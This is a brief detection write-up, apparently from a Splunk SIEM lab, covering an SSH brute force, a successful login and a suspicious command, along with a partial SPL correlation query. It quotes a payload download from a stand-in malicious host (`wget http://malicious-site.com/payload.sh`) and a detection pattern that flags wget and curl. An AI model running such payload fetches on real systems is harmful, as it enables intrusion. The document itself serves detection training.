==============================

📅 Date: June 4, 2025  
📍 Host: siem-server  
👤 User: testuser  

---

🧪 Summary of Events:

1. Multiple failed SSH login attempts (brute force)
2. One successful SSH login
3. Suspicious command executed: `wget http://malicious-site.com/payload.sh`

---

📄 Log Sources Involved:

- /var/log/auth.log (SSH login activity)
- /home/testuser/.bash_history (user command execution)

---

🔍 Detection Approach:

- Combined logs using Splunk
- Normalized `user` and `host` fields
- Correlated failed logins, success, and `wget` via SPL

# spl

    sourcetype=="linux_secure" AND searchmatch("Accepted password"), "SSH Success",
    sourcetype=="bash_history" AND (searchmatch("wget") OR searchmatch("curl")), "Suspicious Command"
